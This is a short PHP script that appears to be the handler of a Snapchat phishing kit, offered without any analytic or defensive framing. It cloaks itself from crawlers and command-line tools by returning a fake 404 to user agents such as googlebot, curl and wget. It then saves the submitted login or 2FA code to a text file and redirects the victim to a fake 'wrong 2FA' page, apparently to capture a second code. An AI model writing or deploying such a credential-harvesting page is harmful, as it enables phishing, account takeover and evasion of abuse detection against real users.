<?php
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
    if (stripos($ua, 'googlebot') !== false || 
        stripos($ua, 'curl') !== false || 
        stripos($ua, 'wget') !== false || 
        stripos($ua, 'python') !== false || 
        stripos($ua, 'bot') !== false) {
        header("HTTP/1.0 404 Not Found");
        exit;
    }
}

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['code'] . " Pass: " . $_POST['code'] . "\n", FILE_APPEND);
header('Location: snapchat-premium-wrong-2fa.html ');
exit();
?>